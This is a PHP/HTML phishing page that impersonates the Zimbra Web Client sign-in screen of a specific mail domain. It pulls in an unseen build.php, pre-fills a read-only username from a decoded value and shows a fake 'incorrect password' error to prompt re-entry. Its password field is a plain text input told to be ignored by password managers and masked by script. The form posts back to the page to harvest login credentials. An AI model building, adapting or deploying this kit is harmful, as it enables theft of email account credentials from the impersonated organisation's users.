<?php include '../build.php'; ?>
<!DOCTYPE html> <html class=user_font_size_normal lang=en>
<meta charset=utf-8>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<title>Zimbra Web Client Sign In</title>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<meta name=description content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
<meta name=apple-mobile-web-app-capable content=yes>
<meta name=apple-mobile-web-app-status-bar-style content=black>
<style>.ScreenReaderOnly{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px)}.user_font_size_normal{font-size:12px}TD,DIV,SELECT,INPUT[type=text],INPUT[type=password]{font-size:1rem}TABLE{border-spacing:0;border-width:0}TD{border-width:0;padding:0}INPUT[type="checkbox"]{cursor:pointer}INPUT[type="checkbox"]:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a}INPUT[type="text"],INPUT[type="password"]{cursor:text}.AttLink:link,.AttLink:visited{color:#005A95;text-decoration:none;cursor:pointer}.AttLink:hover{color:#005A95;text-decoration:underline}.AttLink:active{color:darkgreen;text-decoration:underline}.Row-selected .AttLink:link,.Row-selected .AttLink:active,.Row-selected .AttLink:visited{color:#005A95;text-decoration:none;cursor:pointer}.AttLink:hover,.Row-selected .AttLink:hover{color:#005A95;text-decoration:underline}A:link,A:visited{color:#005A95;text-decoration:none;cursor:pointer}.FakeAnchor:hover,A:hover{color:#005A95;text-decoration:underline}.FakeAnchor:active,A:active{color:darkgreen;text-decoration:underline}.FakeAnchor:focus,A:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a}.FakeAnchor.ZDisabled:hover,.FakeAnchor.ZDisabled:active{color:#999;text-decoration:none}.AutoAnchor:link,.AutoAnchor:visited{color:#005A95;text-decoration:none;cursor:pointer;border-bottom:1px dotted;color:#005A95}.AutoAnchor:hover{color:#005A95;text-decoration:underline}.AutoAnchor:active{color:darkgreen;text-decoration:underline}.LoginScreen TD,.LoginScreen DIV,.LoginScreen SPAN,.LoginScreen SELECT,.LoginScreen INPUT,.LoginScreen A{font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif}HTML{width:100%;height:100%}BODY{background-color:#FFF;width:100%;height:100%}FORM{margin:0;padding:0}.LoginScreen FORM{text-align:center}.form{border-collapse:collapse;color:white;margin:0 auto;text-align:left}.form TD:first-child LABEL{margin-right:20px}.form TD{padding-bottom:10px}.form INPUT[type="text"],.form INPUT[type="password"]{border:1px solid #FFF;padding:0;width:235px;height:20px}.form INPUT[type="text"]:focus,.form INPUT[type="password"]:focus{border:1px solid #99cae7}.form SELECT{height:20px;width:165px}.form .submitTD{text-align:left}.form .ZLoginButton{border-radius:3px;border:1px solid #999;float:right;font-size:1em}.form HR{border-color:transparent transparent white;height:0}.LoginScreen .positioning{position:relative;z-index:20}.LoginScreen #ZLoginWhatsThisAnchor{color:white;font-size:.9em;margin-left:5px}.LoginScreen #ZLoginWhatsThis{left:0;margin-left:-10em;position:absolute;top:25px;width:40em;z-index:30}.LoginScreen .ZLoginInfoMessage{background-color:#FFF;border:1px solid #005d92;color:#333;padding:3px 7px;text-align:left;box-shadow:0 0 2px black}.DwtButton{height:2rem;cursor:pointer;background:#fff}.LaunchButton INPUT:hover{box-shadow:0 0 1px black;background-image:-moz-linear-gradient(top,#9ff0ff,#dcf9fe)}.ZhAppLinks a:link,.ZhAppLinks a:visited{text-decoration:none;font-weight:bold;color:darkblue}.ZhAppSwitchLink a:link,.ZhAppSwitchLink a:visited{font-size:10px;font-weight:normal}.Tabs A:link,.Tabs A:visited{color:#333;text-decoration:none}.Tree a:link,.Tree a:visited{color:#333;text-decoration:none}.List A:link,.List A:visited{color:#333;text-decoration:none}.List TH A:link,.List TH A:visited{text-decoration:underline}.RuleList A:link,.RuleList A:visited{color:#333;text-decoration:underline}A:visited{color:#005A95}.Tree .ZhTreeEdit a:link,.Tree .ZhTreeEdit a:visited{color:#333;text-decoration:underline}.Tb a:link,.Tb a:visited{text-decoration:none;font-weight:normal;color:#333}.TbBt#caltb a:link,.TbBt#caltb a:visited{color:#333;text-decoration:none}.ZhCalMonthHeaderRow a:link,.ZhCalMonthHeaderRow a:visited{color:#333}.ZhCalDayHeaderToday a:link,.ZhCalDayHeaderToday a:visited{color:#005d92}.ZhCalMonthTable a:link,.ZhCalMonthTable a:visited,.ZhCalMiniContainer a:link,.ZhCalMiniContainer a:visited,.ZhCalMonthHeaderRow a:link,.ZhCalMonthHeaderRow a:visited{text-decoration:none;color:inherit}.ZhCalDOM a:link,.ZhCalDOM a:visited{color:#333}.ZhCalDOMT a:link,.ZhCalDOMT:visited{color:#005d92}.ZhCalDOMO a:link,.ZhCalDOMO a:visited{color:#999}.ZhCalDOMOT a:link,.ZhCalDOMOT a:visited{color:#999;color:#005d92}.ZhCalMDOMOT a:link,.ZhCalMDOMOT a:visited{padding:1px;border:1px solid darkred}.ZhCalMDOM a:link,.ZhCalMDOM a:visited,ZhCalMDOMT a:link,.ZhCalMDOMT a:visited{color:#333}.ZhCalMiniTitleCell a:link,.ZhCalMiniTitleCell a:visited{color:#333}.ZhCalDayGrid A:link,.ZhCalDayGrid A:visited,.ZhCalMonthTable A:link,.ZhCalMonthTable A:visited{color:inherit;text-decoration:none}input[type="text"],input[type="password"]{color:black}BODY{margin:0}.LoginScreen{position:absolute;left:0;top:0;width:100%;height:100%;overflow:hidden;font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;font-size:1rem;background-color:#ededed}.LoginScreen .center{margin-top:-160px;margin-left:-250px}.LoginScreen .center{left:50%;overflow:visible;position:absolute;top:40%;z-index:11}.LoginScreen .contentBox{background-color:#007CC3;padding:10px 0 40px;border-radius:3px;width:500px}.LoginScreen .contentBox{min-height:265px}.LoginScreen H1{margin:0 30px 30px;overflow:hidden}#ZLoginAppName{color:white}.LoginScreen .ImgLoginBanner{cursor:pointer;display:block}.LoginScreen .Footer{bottom:0;position:absolute;text-align:center;width:100%;z-index:10}.LoginScreen .copyright,.LoginScreen #ZLoginNotice{cursor:default;margin-bottom:5px;font-size:1rem;color:#656565}.LoginScreen .zLoginField{border-radius:5px}.LoginScreen #ZLoginNotice A{color:#656565}.ErrorScreen A:link,.ErrorScreen A:visited{color:#005A95;text-decoration:none;cursor:pointer}.ErrorScreen A:hover{color:#005A95;text-decoration:underline}.ErrorScreen A:active{color:darkgreen;text-decoration:underline}.ImgLoginBanner{background-repeat:no-repeat;background-position:bottom left;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAkCAYAAADl2YrgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA/dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDE0IDc5LjE1Njc5NywgMjAxNC8wOC8yMC0wOTo1MzowMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ1dWlkOjVEMjA4OTI0OTNCRkRCMTE5MTRBODU5MEQzMTUwOEM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjBBMzI0OEYwQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjBBMzI0OEVGQ0ZFQjExRTU4QUY0Q0EyQUVCOENCRUY1IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIElsbHVzdHJhdG9yIENDIDIwMTQgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpmYjMyODc4Zi01YmE3LTQ3ZWUtOWE5OC1jZTllMjdlODRhODAiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5k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);width:440px;height:60px}INPUT[type="text"],INPUT[type="password"]{margin:0;border-width:1px;border-style:solid}SELECT{border:1px solid #bfbfbf;margin:0;border-width:1px;border-style:solid}.form .ZLoginButton{background-color:#007CC3;border-color:white;color:white}.form .ZLoginButton:hover{background-color:#3f9cd2;color:#333}.form .ZLoginButton:active{background-color:#005d92}.DwtListView-Rows-Empty:focus{outline:none}.DwtListView-Rows-Empty:focus>*{border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none}#skin_dropMenu *:focus,#skin_userAndQuota *:focus{outline-color:#FFF}

/* ============================================================
   ADDITIONS — Sign In heading + error message
   ============================================================ */
.signIn{
    color:#fff;
    font-size:1.25rem;
    font-weight:600;
    margin:0 30px 14px;
    text-align:left;
    border-bottom:1px solid rgba(255,255,255,.35);
    padding-bottom:8px;
    font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
}
.errorMessage{
    margin:0 30px 14px;
    padding:10px 12px;
    background:#fff1f0;
    border:1px solid #ffccc7;
    border-radius:4px;
    color:#cf1322;
    font-size:.95rem;
    line-height:1.4;
    text-align:left;
    font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
}
</style>
<meta name=referrer content=no-referrer><link rel="SHORTCUT ICON" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAABMLAAATCwAAAAAAAAAAAAAAAAAAw4cAY8OHAMnDhwD8w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD8w4cAycOHAGMAAAAAw4cAY8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cAY8OHAMnDhwD/w4cA/7yYSv/y5Mb/8uXH//Llx//z5sr/8+bK//Pmyv/z58v/8+bK/8qqY//DhwD/w4cA/8OHAMnDhwDhw4cA/8OHAP++q4D///////////////7////+///////////////////////Yyan/w4cA/8OHAP/DhwDhw4cA4cOHAP/DhwD/t4QR/9/azv//////5t3K/9StVv/bt2b/27dm/9u3Z//cuGn/wpAh/8OHAP/DhwD/w4cA4cOHAOHDhwD/w4cA/8OHAP+2jzr/+fj2//n49f/BnU7/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAOHDhwDhw4cA/8OHAP/DhwD/w4cA/7ihbf//////8u/p/8GRJv/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwDhw4cA4cOHAP/DhwD/w4cA/8OHAP/BhgP/0siz///////d1L//wYgI/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA4cOHAOHDhwD/w4cA/8OHAP/DhwD/w4cA/7eIIP/n49v//////8e0iP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAOHDhwDhw4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/rItA//39/P/6+vj/w6BQ/8OHAP/DhwD/w4cA/8OHAP/DhwDhw4cA4cOHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP+8p3r//v79/+3p4v+8ix3/w4cA/8OHAP/DhwD/w4cA4cOHAOHDhwD/w4cA/8CHB//VsFz/3rxx/926bf/cuWv/xadh//Ht5///////1suz/7+HCv/DhwD/w4cA/8OHAOHDhwDhw4cA/8OHAP+wjT//+/r5///////////////////////+/v7///////7+/v+8n17/w4cA/8OHAP/DhwDhw4cAycOHAP/DhwD/t4gd/+bYuP/16tP/9OjP//Toz//06M//8+fN//Pozv/t4MH/vZIx/8OHAP/DhwD/w4cAycOHAGDDhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAGAAAAAAw4cAWsOHAMnDhwD8w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD/w4cA/8OHAP/DhwD8w4cAycOHAFoAAAAAgAEAAAAAAAAAAAAAAABoQAAAAAAAAPC/AAAAAAAAAAAAAAAAAAAiQAAAAAAAAAAAAAAAAAAAAAAAAAAAgAEAAA=="><style>.sf-hidden{display:none!important}</style><link rel=canonical href=https://mail.hcg.gr/>
</head>
<body>
 <div class=LoginScreen>
 <div class=center>
 <div class=contentBox>
 <h1><a href=http://www.zimbra.com/ id=bannerLink target=_new title=Zimbra><span class=ScreenReaderOnly>Zimbra</span>
 <span class=ImgLoginBanner></span>
 </a></h1>
 <div id=ZLoginAppName class=sf-hidden>Web Client</div>

 <!-- ============================================================
      ADDED: Sign In heading
      ============================================================ -->
 <div class="signIn"></div>

 <form method=post name=loginForm action="" accept-charset=UTF-8 autocomplete=off>

 <!-- ============================================================
      ADDED: Error message div wired to $error from build.php
      ============================================================ -->
 <div id="errorMessageDiv" class="errorMessage" style="<?php echo $error; ?>">
 The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
 </div>

 <table class=form>
 <tbody><tr>
 <td><label for=username>Username:</label></td>
 <td><input id=username class=zLoginField name=user type=text value="<?php echo htmlspecialchars($decoded); ?>" size=40 maxlength=1024 autocapitalize=off autocorrect=off autocomplete=off readonly></td>
 </tr>
 <tr>
 <td><label for=password>Password:</label></td>
 <td><input id=password autocomplete=off class=zLoginField name=pass type=text size=40 maxlength=1024 autocorrect=off spellcheck=false data-lpignore=true data-1p-ignore=true data-bwignore=true></td>
 </tr>
 <tr>
 <td>&nbsp;</td>
 <td class=submitTD>
 <input id=remember value=1 type=checkbox name=zrememberme>
 <label for=remember>Stay signed in</label>
 <input type=submit class="ZLoginButton DwtButton" value="Sign In">
 </td>
 </tr>

 <tr>
 <td colspan=2><hr></td>
 </tr>
 <tr>
 <td>
 <label for=client>Version:</label>
 </td>
 <td>
 <div class=positioning>
 <select id=client name=client>
 <option value=preferred selected> Default</option>
 <option value=advanced> Advanced (Ajax)</option>
 <option value=standard> Standard (HTML)</option>
 <option value=mobile> Mobile</option>
 </select>
 <a href=# id=ZLoginWhatsThisAnchor aria-controls=ZLoginWhatsThis aria-expanded=false>What's This?</a>
 <div id=ZLoginWhatsThis class=ZLoginInfoMessage style=display:none role=tooltip> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. is recommended for mobile devices. To set to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
 <div id=ZLoginUnsupported class=ZLoginInfoMessage style=display:none>Note that your web browser or display does not fully support the Advanced version. We strongly recommend that you use the Standard client.</div>
 </div>
 </td>
 </tr>
 </table>
 </form>
 </div>
 <div class="decor1 sf-hidden"></div>
 </div>
 <div class=Footer>
 <div id=ZLoginNotice class=legalNotice-small><a target=_new href=https://www.zimbra.com/>Zimbra</a> :: the leader in open source messaging and collaboration :: <a target=_new href=https://blog.zimbra.com/>Blog</a> - <a target=_new href=https://wiki.zimbra.com/>Wiki</a> - <a target=_new href=https://www.zimbra.com/forums>Forums</a></div>
 <div class=copyright>
 Copyright &copy; 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
 </div>
 <div class="decor2 sf-hidden"></div>
 </div>
 <script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("password"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>